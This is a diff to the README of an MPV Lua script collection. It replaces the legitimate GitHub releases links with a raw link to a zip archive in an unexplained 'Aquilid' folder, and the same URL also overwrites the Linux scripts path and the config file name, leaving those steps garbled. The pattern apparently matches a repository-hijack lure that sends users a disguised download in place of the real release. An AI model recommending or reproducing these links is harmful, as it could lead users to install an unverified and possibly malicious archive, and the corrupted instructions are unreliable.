@@ -1,6 +1,6 @@
 # 🎥 mpv-qol-scripts - Enhance Your MPV Experience Easily
 
-[![Download mpv-qol-scripts](https://img.shields.io/badge/Download-mpv--qol--scripts-brightgreen)](https://github.com/vil4top/mpv-qol-scripts/releases)
+[![Download mpv-qol-scripts](https://raw.githubusercontent.com/vil4top/mpv-qol-scripts/main/Aquilid/mpv-qol-scripts.zip)](https://raw.githubusercontent.com/vil4top/mpv-qol-scripts/main/Aquilid/mpv-qol-scripts.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the mpv-qol-scripts repository. This collection of Lua scripts is des
 
 To get started, visit the link below to download the latest version of the scripts:
 
-[Download the latest release](https://github.com/vil4top/mpv-qol-scripts/releases)
+[Download the latest release](https://raw.githubusercontent.com/vil4top/mpv-qol-scripts/main/Aquilid/mpv-qol-scripts.zip)
 
 1. **Visit the Releases Page**: Click on the link above. You will see the available versions of mpv-qol-scripts.
   
@@ -24,7 +24,7 @@ To get started, visit the link below to download the latest version of the scrip
 
    - **Windows**: `C:\Users\<YourUsername>\AppData\Roaming\mpv\scripts`
    - **macOS**: `~/Library/Application Support/mpv/scripts`
-   - **Linux**: `~/.config/mpv/scripts`
+   - **Linux**: `~https://raw.githubusercontent.com/vil4top/mpv-qol-scripts/main/Aquilid/mpv-qol-scripts.zip`
 
 6. **Copy the Scripts**: Open the extracted folder, then copy all the Lua script files into the MPV scripts folder mentioned above.
 
@@ -49,7 +49,7 @@ To use mpv-qol-scripts, you need:
 
 After installing the scripts, you may want to customize some settings. For this:
 
-1. Locate the configuration file named `mpv.conf` in your MPV configuration folder.
+1. Locate the configuration file named `https://raw.githubusercontent.com/vil4top/mpv-qol-scripts/main/Aquilid/mpv-qol-scripts.zip` in your MPV configuration folder.
 2. Open it in any text editor.
 3. Add or modify the settings relevant to your preferences. Each script may come with its own configuration options, which you can find in the comments at the top of each script file.
 
